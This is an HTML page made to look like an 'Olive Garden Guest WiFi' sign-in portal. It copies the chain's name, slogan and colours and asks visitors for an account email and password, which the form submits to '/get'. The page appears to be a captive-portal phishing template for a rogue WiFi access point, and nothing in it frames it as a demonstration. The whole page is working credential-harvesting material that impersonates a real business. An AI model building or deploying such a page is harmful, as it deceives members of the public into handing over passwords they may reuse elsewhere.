<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Georgia,"Times New Roman",serif;background:#2d5016;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.oglogo{text-align:center;margin-bottom:20px}
.oglogo h1{font-size:26px;font-weight:700;color:#fff;letter-spacing:0.5px;font-style:italic}
.oglogo p{font-size:11px;color:rgba(255,255,255,0.65);letter-spacing:1.5px;text-transform:uppercase;margin-top:5px;font-family:sans-serif}
.card{background:#fff;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.3)}
.ch{background:#1a3a0a;padding:20px 24px;text-align:center;border-bottom:2px solid #8B6914}
.ch h1{font-size:16px;font-weight:700;color:#fff;font-style:italic}.ch p{font-size:12px;color:rgba(255,255,255,0.65);margin-top:3px;font-family:sans-serif}
.cb{padding:24px;font-family:sans-serif}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0ddd8;border-radius:9px;font-size:15px;background:#faf8f5;color:#1a1a1a}
input:focus{outline:none;border-color:#2d5016;box-shadow:0 0 0 3px rgba(45,80,22,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#2d5016}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#2d5016;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="oglogo"><h1>Olive Garden</h1><p>When you're here, you're family</p></div>
<div class="card">
  <div class="ch"><h1>Olive Garden Guest WiFi</h1><p>Sign in to connect</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Olive Garden's Terms</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
</div>
</body>
</html>
